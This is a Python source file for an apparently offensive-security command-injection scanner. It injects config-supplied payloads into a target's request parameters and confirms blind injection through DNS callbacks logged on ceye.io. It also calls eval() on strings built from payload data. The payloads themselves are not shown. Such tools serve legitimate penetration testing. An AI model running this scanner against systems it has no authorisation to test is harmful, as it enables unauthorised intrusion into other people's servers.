# coding=utf-8
# command inject scanner
# by Th1s

from lib.scanner import *
from lib.config import command_inject_config
import requests
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [line:%(lineno)d] - %(levelname)s: %(message)s')


# command 检测模块
# 利用ceye
class CommandInjectScanner(Scanner):

    def __init__(self, *args, **kwargs):

        Scanner.__init__(self, *args, **kwargs)

        # payload   dict    注入payload
        self.payload = command_inject_config['payload']

        # ceye
        self.ceye_host = command_inject_config["ceye_host"]
        self.ceye_api = command_inject_config["ceye_api"]

    # override
    def doScan(self, q):
        while not q.empty():
            scan_param = q.get()

            # do scan here
            if scan_param.keys() == self.param.keys():
                random_key = str(random.random())
                string_scan_param = json.dumps(scan_param) % (random_key, self.ceye_host)
                scan_param = eval(string_scan_param)
                flag = self.doCurl(scan_param, self.data, self.header)

                # command inject
                r = requests.get("http://api.ceye.io/v1/records?token=%s&type=dns&filter=" % self.ceye_api)
                search_result = r.content
                if search_result.find(random_key) > 0:
                    code_inject_flag = True
                    logging.info('command inject in %s : %s' % (self.url, scan_param))
                    self.scan_result["param"].append(scan_param)
                    self.scan_result["ret"] = 1

            else:
                random_key = str(random.random())
                string_scan_param = json.dumps(scan_param) % (random_key, self.ceye_host)
                scan_param = eval(string_scan_param)
                flag = self.doCurl(self.param, scan_param, self.header)

                # command inject
                r = requests.get("http://api.ceye.io/v1/records?token=%s&type=dns&filter=" % self.ceye_api)
                search_result = r.content
                if search_result.find(random_key) > 0:
                    code_inject_flag = True
                    logging.info('command inject in %s : %s' % (self.url, scan_param))
                    self.scan_result["param"].append(scan_param)
                    self.scan_result["ret"] = 1

            q.task_done()

if __name__ == "__main__":
    method = "get"
    url = "http://www.th1s.cn/test/sqli/command.php"
    header = {}
    param = {"id": 1, "bbb": 3}
    data = {}

    test = CommandInjectScanner(method, url, header, param, data)
    test.doWork()

    # result in scan_result
    print test.scan_result